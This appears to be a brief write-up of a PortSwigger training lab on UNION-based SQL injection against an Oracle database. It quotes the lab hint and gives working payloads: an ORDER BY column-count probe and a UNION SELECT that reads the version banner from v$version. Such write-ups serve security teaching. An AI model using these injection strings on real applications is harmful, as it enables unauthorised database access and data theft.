

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

#### Hint

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

For more information, see our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

we need to know number of column so we use **order by** 

%27+order+by+2 --

when try 3 we get an error so number of column is 2 

now try use union attack to display version of **Oracle** 

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

- we get query from sql injection cheat sheet :)

![](https://cdn-images-1.medium.com/max/1000/1*t5M4k3r4tGRJ5h-lgei5jg.png)

![](https://cdn-images-1.medium.com/max/1000/1*F5WHeLVDVCjWW5yr8ysRzA.png)